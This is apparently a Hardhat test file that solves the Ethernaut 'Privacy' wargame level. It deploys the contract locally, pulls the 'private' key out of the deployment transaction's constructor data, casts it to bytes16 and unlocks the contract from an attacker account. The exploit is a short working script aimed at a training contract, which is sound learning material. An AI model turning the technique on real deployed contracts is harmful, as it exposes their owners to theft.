import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { ethers } from "hardhat";
import { Privacy } from "typechain-types";

// Challenge description

// The creator of this contract was careful enough to protect the sensitive areas of its storage.
// Unlock this contract to beat the level.

// Things that might help:
// Understanding how storage works
// Understanding how parameter parsing works
// Understanding how casting works

// Tips:
// Remember that metamask is just a commodity. Use another tool if it is presenting problems.
// Advanced gameplay could involve using remix, or your own web3 provider.

describe("Ethernaut - Privacy", async () => {
  let privacy: Privacy;
  let owner: SignerWithAddress, attacker: SignerWithAddress;

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    const a = ethers.utils.formatBytes32String("super");
    const b = ethers.utils.formatBytes32String("secret");
    const c = ethers.utils.formatBytes32String("password");
    privacy = await ethers
      .getContractFactory("Privacy", owner)
      .then((f) => f.deploy([a, b, c]));
  });

  it("Hacks", async () => {
    expect(await privacy.locked()).equal(true);

    // Get Contract creation Input Data (should be found on etherscan)
    const deployInputData = privacy.deployTransaction.data;

    const privacyFactory = await ethers.getContractFactory("Privacy");

    // get rid of bytecode and obtain passed constructor arguments
    const passwordFromInputData = ethers.utils.hexDataSlice(
      deployInputData,
      privacyFactory.bytecode.length / 2 - 1,
    );

    // get last argument and convert it from bytes32 to bytes16
    const key = ethers.utils.hexDataSlice(
      ethers.utils.hexDataSlice(passwordFromInputData, 64),
      0,
      16,
    );

    // exploit the contract
    await privacy.connect(attacker).unlock(key);

    expect(await privacy.locked()).equal(false);
  });
});
